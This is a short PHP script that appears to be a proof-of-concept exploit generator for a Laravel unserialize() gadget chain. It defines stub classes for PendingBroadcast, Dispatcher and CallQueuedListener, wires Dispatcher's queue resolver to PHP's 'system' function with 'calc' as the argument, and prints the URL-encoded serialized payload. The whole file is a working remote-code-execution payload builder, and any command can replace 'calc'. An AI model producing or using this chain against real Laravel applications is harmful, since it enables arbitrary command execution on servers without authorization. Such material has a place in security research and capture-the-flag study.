<?php
    namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($a){
            $this->queueResolver = $a;
        }
    }
}

namespace Illuminate\Events{
    class CallQueuedListener{
        public $connection;
        public function __construct($a){
            $this->connection = $a;
        }
    }
}

namespace {
    $a = new Illuminate\Events\CallQueuedListener("calc");
    $b = new Illuminate\Bus\Dispatcher("system");
    $c = new Illuminate\Broadcasting\PendingBroadcast($b, $a);
    echo urlencode(serialize($c));
}
